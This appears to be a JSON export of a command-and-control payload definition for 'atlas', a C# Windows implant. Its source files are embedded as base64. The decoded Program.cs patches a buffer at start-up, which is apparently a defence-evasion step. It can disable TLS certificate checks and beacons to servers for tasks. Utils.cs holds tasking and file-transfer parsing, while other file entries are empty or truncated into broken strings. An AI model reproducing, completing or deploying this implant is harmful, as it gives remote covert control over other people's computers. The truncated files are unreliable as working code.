{
  "payload_types": [
    {
      "wrapper": false,
      "command_template": "\n",
      "supported_os": "Windows (x86),Windows (x64)",
      "execute_help": "Run as a normal executable on Windows or use the donut project to turn into shellcode: https:\/\/github.com\/TheWover\/donut",
      "external": false,
      "container_running": true,
      "service": "rabbitmq",
      "author": "@Airzero24",
      "note": "This payload uses C# to target Windows hosts with the .NET framework installed. For more information and a more detailed README, check out: https:\/\/github.com\/airzero24\/Atlas",
      "supports_dynamic_loading": false,
      "deleted": false,
      "last_heartbeat": "04\/13\/2020 03:18:35",
      "ptype": "atlas",
      "file_extension": "exe",
      "wrapped_payload_type": "null",
      "icon": null,
      "files": [
        {
          "Http_3.5.cs": ""
        },
        {
          "Program.cs": "bmFtZXNwYWNlIEF0bGFzDQp7DQogICAgY2xhc3MgUHJvZ3JhbQ0KICAgIHsNCiAgICAgICAgcHVibGljIHN0YXRpYyB2b2lkIE1haW4oc3RyaW5nW10gYXJncykNCiAgICAgICAgew0KICAgICAgICAgICAgTW9kdWxlcy5QYXRjaEJ1ZmZlcigpOw0KICAgICAgICAgICAgVXRpbHMuR2V0U2VydmVycygpOw0KI2lmIENFUlRfRkFMU0UNCiAgICAgICAgICAgIFN5c3RlbS5OZXQuU2VydmljZVBvaW50TWFuYWdlci5TZXJ2ZXJDZXJ0aWZpY2F0ZVZhbGlkYXRpb25DYWxsYmFjayA9IGRlbGVnYXRlIHsgcmV0dXJuIHRydWU7IH07DQojZW5kaWYNCiAgICAgICAgICAgIHdoaWxlICghSHR0cC5DaGVja0luKCkpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaW50IER3ZWxsID0gVXRpbHMuR2V0RHdlbGxUaW1lKCk7DQogICAgICAgICAgICAgICAgU3lzdGVtLlRocmVhZGluZy5UaHJlYWQuU2xlZXAoRHdlbGwpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgVXRpbHMuSm9iTGlzdCBKb2JMaXN0ID0gbmV3IFV0aWxzLkpvYkxpc3QNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBqb2JfY291bnQgPSAwLA0KICAgICAgICAgICAgICAgIGpvYnMgPSB7IH0NCiAgICAgICAgICAgIH07DQogICAgICAgICAgICB3aGlsZSAodHJ1ZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBVdGlscy5Mb29wKEpvYkxpc3QpOw0KICAgICAgICAgICAgICAgIGludCBEd2VsbCA9IFV0aWxzLkdldER3ZWxsVGltZSgpOw0KICAgICAgICAgICAgICAgIFN5c3RlbS5UaHJlYWRpbmcuVGhyZWFkLlNsZWVwKER3ZWxsKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCn0NCg=="
        },
        {
          "Crypto.cs": "77u\"
        },
        {
          "Utils.cs": "\/J2dyb3VwMScuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInsyfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7Mn0iLCAiKD8nZ3JvdXAyJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgTWF0Y2ggbWF0Y2ggPSBuZXcgUmVnZXgoZm9ybWF0KS5NYXRjaChkYXRhKTsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gbWF0Y2hlcyA9IG5ldyBMaXN0PHN0cmluZz4oKTsNCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDAiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMSJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMiJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDIiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbWF0Y2hlczsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBDaGVja0luUmVzcG9uc2UgRnJvbUpzb24oc3RyaW5nIG1lc3NhZ2UpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IHBhcnNlTGlzdCA9IENoZWNrSW5SZXNwb25zZS5QYXJzZShtZXNzYWdlLCBDaGVja0luUmVzcG9uc2VGb3JtYXQuUmVwbGFjZSgie3siLCAieyIpLlJlcGxhY2UoIn19IiwgIn0iKSk7DQogICAgICAgICAgICAgICAgaWYgKHBhcnNlTGlzdC5Db3VudCAhPSAzKSB7IHJldHVybiBudWxsOyB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBDaGVja0luUmVzcG9uc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHN0YXR1cyA9IHBhcnNlTGlzdFswXSwNCiAgICAgICAgICAgICAgICAgICAgaWQgPSBwYXJzZUxpc3RbMV0sDQogICAgICAgICAgICAgICAgICAgIGFjdGlvbiA9IHBhcnNlTGlzdFsyXQ0KICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgR2V0VGFza2luZw0KICAgICAgICB7DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGFjdGlvbiB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgaW50IHRhc2tpbmdfc2l6ZSB7IGdldDsgc2V0OyB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgSnNvbkZvcm1hdCA9IEAie3siImFjdGlvbiIiOiIiezB9IiIsIiJ0YXNraW5nX3NpemUiIjp7MX19fSI7DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFRvSnNvbihHZXRUYXNraW5nIGdldF90YXNraW5nKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJldHVybiBTdHJpbmcuRm9ybWF0KA0KICAgICAgICAgICAgICAgICAgICBnZXRfdGFza2luZy5Kc29uRm9ybWF0LA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKGdldF90YXNraW5nLmFjdGlvbiksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUoZ2V0X3Rhc2tpbmcudGFza2luZ19zaXplLlRvU3RyaW5nKCkpDQogICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBjbGFzcyBHZXRUYXNraW5nUmVzcG9uc2UNCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBhY3Rpb24geyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIExpc3Q8VGFzaz4gdGFza3MgeyBnZXQ7IHNldDsgfQ0KDQogICAgICAgICAgICBwdWJsaWMgR2V0VGFza2luZ1Jlc3BvbnNlKCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB0YXNrcyA9IG5ldyBMaXN0PFRhc2s+KCk7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEdldFRhc2tpbmdSZXNwb25zZUZvcm1hdCA9IEAie3siImFjdGlvbiIiOiAiInswfSIiLCAiInRhc2tzIiI6IHsxfX19IjsNCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBMaXN0PHN0cmluZz4gUGFyc2Uoc3RyaW5nIGRhdGEsIHN0cmluZyBmb3JtYXQpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgZm9ybWF0ID0gUmVnZXguRXNjYXBlKGZvcm1hdCkuUmVwbGFjZSgiXFx7IiwgInsiKTsNCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MH0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezB9IiwgIig\/J2dyb3VwMCcuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInsxfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MX0iLCAiKD8nZ3JvdXAxJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgTWF0Y2ggbWF0Y2ggPSBuZXcgUmVnZXgoZm9ybWF0KS5NYXRjaChkYXRhKTsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gbWF0Y2hlcyA9IG5ldyBMaXN0PHN0cmluZz4oKTsNCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDAiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMSJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBtYXRjaGVzOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIEdldFRhc2tpbmdSZXNwb25zZSBGcm9tSnNvbihzdHJpbmcgbWVzc2FnZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gcGFyc2VMaXN0ID0gR2V0VGFza2luZ1Jlc3BvbnNlLlBhcnNlKG1lc3NhZ2UsIEdldFRhc2tpbmdSZXNwb25zZUZvcm1hdC5SZXBsYWNlKCJ7eyIsICJ7IikuUmVwbGFjZSgifX0iLCAifSIpKTsNCiAgICAgICAgICAgICAgICBpZiAocGFyc2VMaXN0LkNvdW50ICE9IDIpIHsgcmV0dXJuIG51bGw7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbmV3IEdldFRhc2tpbmdSZXNwb25zZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgYWN0aW9uID0gcGFyc2VMaXN0WzBdLA0KICAgICAgICAgICAgICAgICAgICB0YXNrcyA9IFRhc2suUGFyc2VUYXNrcyhwYXJzZUxpc3RbMV0pDQogICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBjbGFzcyBQb3N0UmVzcG9uc2UNCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBhY3Rpb24geyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIExpc3Q8VGFza1Jlc3BvbnNlPiByZXNwb25zZXMgeyBnZXQ7IHNldDsgfQ0KDQogICAgICAgICAgICBwdWJsaWMgUG9zdFJlc3BvbnNlKCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXNwb25zZXMgPSBuZXcgTGlzdDxUYXNrUmVzcG9uc2U+KCk7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgSnNvbkZvcm1hdCA9IEAie3siImFjdGlvbiIiOiIiezB9IiIsIiJyZXNwb25zZXMiIjpbezF9XX19IjsNCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgVG9Kc29uKFBvc3RSZXNwb25zZSBwb3N0X3Jlc3BvbnNlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHN0cmluZyByZXNwb25zZXMgPSAiIjsNCiAgICAgICAgICAgICAgICBpbnQgY291bnQgPSAwOw0KICAgICAgICAgICAgICAgIGZvcmVhY2ggKFRhc2tSZXNwb25zZSB0YXNrX3Jlc3BvbnNlIGluIHBvc3RfcmVzcG9uc2UucmVzcG9uc2VzKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKChjb3VudCArIDEpID09IHBvc3RfcmVzcG9uc2UucmVzcG9uc2VzLkNvdW50KQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICByZXNwb25zZXMgKz0gVGFza1Jlc3BvbnNlLlRvSnNvbih0YXNrX3Jlc3BvbnNlKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJlc3BvbnNlcyArPSBUYXNrUmVzcG9uc2UuVG9Kc29uKHRhc2tfcmVzcG9uc2UpICsgJywnOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICsrY291bnQ7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHJldHVybiAie1wiYWN0aW9uXCI6IFwiIiArIHBvc3RfcmVzcG9uc2UuYWN0aW9uICsgIlwiLCBcInJlc3BvbnNlc1wiOiBbIiArIHJlc3BvbnNlcyArICJdfSI7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgUG9zdFJlc3BvbnNlUmVzcG9uc2UNCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBhY3Rpb24geyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIExpc3Q8UmVzcG9uc2U+IHJlc3BvbnNlcyB7IGdldDsgc2V0OyB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBQb3N0UmVzcG9uc2VSZXNwb25zZSgpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmVzcG9uc2VzID0gbmV3IExpc3Q8UmVzcG9uc2U+KCk7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFBvc3RSZXNwb25zZVJlc3BvbnNlRm9ybWF0ID0gQCJ7eyIiYWN0aW9uIiI6ICIiezB9IiIsICIicmVzcG9uc2VzIiI6IHsxfX19IjsNCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBMaXN0PHN0cmluZz4gUGFyc2Uoc3RyaW5nIGRhdGEsIHN0cmluZyBmb3JtYXQpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgZm9ybWF0ID0gUmVnZXguRXNjYXBlKGZvcm1hdCkuUmVwbGFjZSgiXFx7IiwgInsiKTsNCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MH0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezB9IiwgIig\/J2dyb3VwMCcuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInsxfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MX0iLCAiKD8nZ3JvdXAxJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgTWF0Y2ggbWF0Y2ggPSBuZXcgUmVnZXgoZm9ybWF0KS5NYXRjaChkYXRhKTsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gbWF0Y2hlcyA9IG5ldyBMaXN0PHN0cmluZz4oKTsNCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDAiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMSJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBtYXRjaGVzOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIFBvc3RSZXNwb25zZVJlc3BvbnNlIEZyb21Kc29uKHN0cmluZyBtZXNzYWdlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIExpc3Q8c3RyaW5nPiBwYXJzZUxpc3QgPSBQb3N0UmVzcG9uc2VSZXNwb25zZS5QYXJzZShtZXNzYWdlLCBQb3N0UmVzcG9uc2VSZXNwb25zZUZvcm1hdC5SZXBsYWNlKCJ7eyIsICJ7IikuUmVwbGFjZSgifX0iLCAifSIpKTsNCiAgICAgICAgICAgICAgICBpZiAocGFyc2VMaXN0LkNvdW50ICE9IDIpIHsgcmV0dXJuIG51bGw7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFBvc3RSZXNwb25zZVJlc3BvbnNlDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBhY3Rpb24gPSBwYXJzZUxpc3RbMF0sDQogICAgICAgICAgICAgICAgICAgIHJlc3BvbnNlcyA9IFJlc3BvbnNlLlBhcnNlUmVzcG9uc2VzKHBhcnNlTGlzdFsxXSkNCiAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIGNsYXNzIFRhc2sgDQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgY29tbWFuZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHBhcmFtZXRlcnMgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBpZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHRpbWVzdGFtcCB7IGdldDsgc2V0OyB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFRhc2tGb3JtYXQgPSBAInt7IiJjb21tYW5kIiI6ICIiezB9IiIsICIicGFyYW1ldGVycyIiOiAiInsxfSIiLCAiImlkIiI6ICIiezJ9IiIsICIidGltZXN0YW1wIiI6IHszfX19IjsNCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBMaXN0PHN0cmluZz4gUGFyc2Uoc3RyaW5nIGRhdGEsIHN0cmluZyBmb3JtYXQpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgZm9ybWF0ID0gUmVnZXguRXNjYXBlKGZvcm1hdCkuUmVwbGFjZSgiXFx7IiwgInsiKTsNCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MH0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezB9IiwgIig\/J2dyb3VwMCcuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInsxfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MX0iLCAiKD8nZ3JvdXAxJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezJ9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInsyfSIsICIoPydncm91cDInLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7M30iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezN9IiwgIig\/J2dyb3VwMycuKikiKTsgfQ0KICAgICAgICAgICAgICAgIE1hdGNoIG1hdGNoID0gbmV3IFJlZ2V4KGZvcm1hdCkuTWF0Y2goZGF0YSk7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IG1hdGNoZXMgPSBuZXcgTGlzdDxzdHJpbmc+KCk7DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMCJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMSJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDEiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDIiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAyIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAzIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMyJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBtYXRjaGVzOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIExpc3Q8VGFzaz4gUGFyc2VUYXNrcyhzdHJpbmcgdGFza3NfanNvbikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAodGFza3NfanNvbiA9PSAiW10iKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG51bGw7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHRhc2tzX2pzb24gPSB0YXNrc19qc29uLlJlcGxhY2UoIlsiLCBAIiIpLlJlcGxhY2UoIl0iLCBAIiIpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBMaXN0PFRhc2s+IHRhc2tzID0gbmV3IExpc3Q8VGFzaz4oKTsNCiAgICAgICAgICAgICAgICBzdHJpbmdbXSB0YXNrc19zcGxpdCA9IHRhc2tzX2pzb24uU3BsaXQobmV3W10geyAifSwiIH0sIFN0cmluZ1NwbGl0T3B0aW9ucy5SZW1vdmVFbXB0eUVudHJpZXMpOw0KICAgICAgICAgICAgICAgIGludCBjb3VudCA9IDA7DQogICAgICAgICAgICAgICAgZm9yZWFjaCAoc3RyaW5nIHRhc2sgaW4gdGFza3Nfc3BsaXQpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gcGFyc2VMaXN0ID0gbmV3IExpc3Q8c3RyaW5nPiB7IH07DQogICAgICAgICAgICAgICAgICAgIGlmIChjb3VudCArIDEgIT0gdGFza3Nfc3BsaXQuTGVuZ3RoKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBwYXJzZUxpc3QgPSBUYXNrLlBhcnNlKHRhc2sgKyAifSIsIFRhc2tGb3JtYXQuUmVwbGFjZSgie3siLCAieyIpLlJlcGxhY2UoIn19IiwgIn0iKSk7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAocGFyc2VMaXN0WzBdID09ICIiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyBmb3JtYXQgPSBAInt7IiJjb21tYW5kIiI6ICIiezB9IiIsICIicGFyYW1ldGVycyIiOiAiInsxfSIiLCAiImlkIiI6ICIiezJ9IiIsICIidGltZXN0YW1wIiI6IHszfX19IjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXJzZUxpc3QgPSBUYXNrLlBhcnNlKHRhc2ssIGZvcm1hdC5SZXBsYWNlKCJ7eyIsICJ7IikuUmVwbGFjZSgifX0iLCAifSIpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHBhcnNlTGlzdCA9IFRhc2suUGFyc2UodGFzayArICJ9IiwgVGFza0Zvcm1hdC5SZXBsYWNlKCJ7eyIsICJ7IikuUmVwbGFjZSgifX0iLCAifSIpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwYXJzZUxpc3RbMF0gPT0gIiIpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nIGZvcm1hdCA9IEAie3siImNvbW1hbmQiIjogIiJ7MH0iIiwgIiJwYXJhbWV0ZXJzIiI6ICIiezF9IiIsICIiaWQiIjogIiJ7Mn0iIiwgIiJ0aW1lc3RhbXAiIjogezN9fX0iOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcnNlTGlzdCA9IFRhc2suUGFyc2UodGFzaywgZm9ybWF0LlJlcGxhY2UoInt7IiwgInsiKS5SZXBsYWNlKCJ9fSIsICJ9IikpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGlmIChwYXJzZUxpc3QuQ291bnQgIT0gNCkgeyByZXR1cm4gbnVsbDsgfQ0KICAgICAgICAgICAgICAgICAgICBUYXNrIG5ld190YXNrID0gbmV3IFRhc2sNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZCA9IHBhcnNlTGlzdFswXSwNCiAgICAgICAgICAgICAgICAgICAgICAgIHBhcmFtZXRlcnMgPSBwYXJzZUxpc3RbMV0sDQogICAgICAgICAgICAgICAgICAgICAgICBpZCA9IHBhcnNlTGlzdFsyXSwNCiAgICAgICAgICAgICAgICAgICAgICAgIHRpbWVzdGFtcCA9IHBhcnNlTGlzdFszXQ0KICAgICAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgICAgICB0YXNrcy5BZGQobmV3X3Rhc2spOw0KICAgICAgICAgICAgICAgICAgICArK2NvdW50Ow0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICByZXR1cm4gdGFza3M7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgVGFza1Jlc3BvbnNlDQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgdGFza19pZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHVzZXJfb3V0cHV0IHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgc3RhdHVzIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgY29tcGxldGVkIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgZXJyb3IgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGludD8gdG90YWxfY2h1bmtzIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgZnVsbF9wYXRoIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBpbnQ\/IGNodW5rX251bSB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGNodW5rX2RhdGEgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBmaWxlX2lkIHsgZ2V0OyBzZXQ7IH0NCg0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBKc29uRm9ybWF0ID0gQCJ7eyIidGFza19pZCIiOiIiezB9IiIsIiJ1c2VyX291dHB1dCIiOiIiezF9IiIsIiJzdGF0dXMiIjoiInsyfSIiLCIiY29tcGxldGVkIiI6ezN9LCIiZXJyb3IiIjoiIns0fSIiLCIidG90YWxfY2h1bmtzIiI6ezV9LCIiZnVsbF9wYXRoIiI6IiJ7Nn0iIiwiImNodW5rX251bSIiOns3fSwiImNodW5rX2RhdGEiIjoiIns4fSIiLCIiZmlsZV9pZCIiOiIiezl9IiJ9fSI7DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIEpzb25Gb3JtYXQxID0gQCJ7eyIidGFza19pZCIiOiIiezB9IiIsIiJ1c2VyX291dHB1dCIiOiIiezF9IiIsIiJzdGF0dXMiIjoiInsyfSIiLCIiY29tcGxldGVkIiI6IiJ7M30iIiwiImVycm9yIiI6IiJ7NH0iIiwiInRvdGFsX2NodW5rcyIiOiIiezV9IiIsIiJmdWxsX3BhdGgiIjoiIns2fSIiLCIiY2h1bmtfbnVtIiI6ezd9LCIiY2h1bmtfZGF0YSIiOiIiezh9IiIsIiJmaWxlX2lkIiI6IiJ7OX0iIn19IjsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgSnNvbkZvcm1hdDIgPSBAInt7IiJ0YXNrX2lkIiI6IiJ7MH0iIiwiInVzZXJfb3V0cHV0IiI6IiJ7MX0iIiwiInN0YXR1cyIiOiIiezJ9IiIsIiJjb21wbGV0ZWQiIjoiInszfSIiLCIiZXJyb3IiIjoiIns0fSIiLCIidG90YWxfY2h1bmtzIiI6ezV9LCIiZnVsbF9wYXRoIiI6IiJ7Nn0iIiwiImNodW5rX251bSIiOiIiezd9IiIsIiJjaHVua19kYXRhIiI6IiJ7OH0iIiwiImZpbGVfaWQiIjoiIns5fSIifX0iOw0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBKc29uRm9ybWF0MyA9IEAie3siInRhc2tfaWQiIjoiInswfSIiLCIidXNlcl9vd